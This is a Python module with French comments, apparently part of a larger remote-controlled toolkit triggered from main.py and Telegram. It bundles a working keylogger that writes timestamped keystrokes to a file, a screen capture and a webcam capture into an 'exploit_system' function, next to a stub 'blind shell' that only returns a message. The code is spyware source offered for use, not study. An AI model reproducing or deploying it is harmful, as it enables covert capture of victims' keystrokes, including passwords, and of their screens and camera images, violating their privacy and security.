import os
import sys
import socket
import subprocess
import time
from datetime import datetime
from pathlib import Path

# ‚úÖ Import dynamique du projet
current_dir = os.path.dirname(os.path.abspath(__file__))
project_root = os.path.abspath(os.path.join(current_dir, ".."))
if project_root not in sys.path:
    sys.path.insert(0, project_root)

# üìÅ Dossiers de sortie
BASE_DIR = Path(project_root)
OUTPUT_DIR = BASE_DIR / "outputs"
KEYLOG_PATH = OUTPUT_DIR / "keylogs" / "keylog.txt"
SCREENSHOT_PATH = OUTPUT_DIR / "screenshots" / f"screenshot_{datetime.now():%Y%m%d_%H%M%S}.png"
WEBCAM_PATH = OUTPUT_DIR / "screenshots" / f"webcam_{datetime.now():%Y%m%d_%H%M%S}.jpg"

for path in [KEYLOG_PATH.parent, SCREENSHOT_PATH.parent]:
    os.makedirs(path, exist_ok=True)

# üîá Modules optionnels
try:
    if os.environ.get("DISPLAY"):
        import pyautogui
    else:
        raise ImportError("DISPLAY non d√©fini")
except Exception as e:
    pyautogui = None
    print(f"‚ö†Ô∏è pyautogui d√©sactiv√© : {e}")

try:
    import cv2
except ImportError:
    cv2 = None
    print("‚ö†Ô∏è OpenCV (cv2) non disponible")

# ----------------------------------------
# üêö Blind Shell (Remote Trigger Only)
# ----------------------------------------
def simulate_blind_shell():
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    return f"üéØ Blind Shell simul√©e √† distance ({now}) - aucun acc√®s shell direct requis."

# ‚å®Ô∏è Keylogger
def start_keylogger(duration_sec=60):
    try:
        from pynput.keyboard import Listener

        def on_press(key):
            try:
                with open(KEYLOG_PATH, "a", encoding="utf-8") as f:
                    ts = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
                    char = getattr(key, 'char', None)
                    f.write(f"{ts}{char or str(key)}\n")
            except: pass

        listener = Listener(on_press=on_press)
        listener.start()
        time.sleep(duration_sec)
        listener.stop()
        return f"‚úÖ Keylogger lanc√© ({duration_sec}s)"
    except Exception as e:
        return f"‚ùå Erreur Keylogger : {e}"

# üì∏ Capture √©cran
def take_screenshot():
    if pyautogui:
        try:
            pyautogui.screenshot(SCREENSHOT_PATH)
            return f"‚úÖ Capture √©cran : {SCREENSHOT_PATH}"
        except Exception as e:
            return f"‚ùå Screenshot √©chou√© : {e}"
    return "‚ö†Ô∏è pyautogui indisponible (pas de DISPLAY)"

# üé• Capture webcam
def capture_webcam():
    if cv2:
        try:
            cam = cv2.VideoCapture(0)
            ret, frame = cam.read()
            cam.release()
            if ret:
                cv2.imwrite(str(WEBCAM_PATH), frame)
                return f"‚úÖ Webcam captur√©e : {WEBCAM_PATH}"
            return "‚ùå Webcam inaccessible"
        except Exception as e:
            return f"‚ùå Erreur webcam : {e}"
    return "‚ö†Ô∏è cv2 non disponible"

# üéØ Exploitation compl√®te
def exploit_system(target_ip=None):
    results = [
        simulate_blind_shell(),
        take_screenshot(),
        capture_webcam(),
        start_keylogger(60)
    ]
    return "\n".join(results)

# ‚úÖ Utilis√© par main.py et Telegram
def run(ip=None):
    return exploit_system(ip)

# ‚ùå Suppression du mode CLI direct pour s√©curiser l‚Äôusage
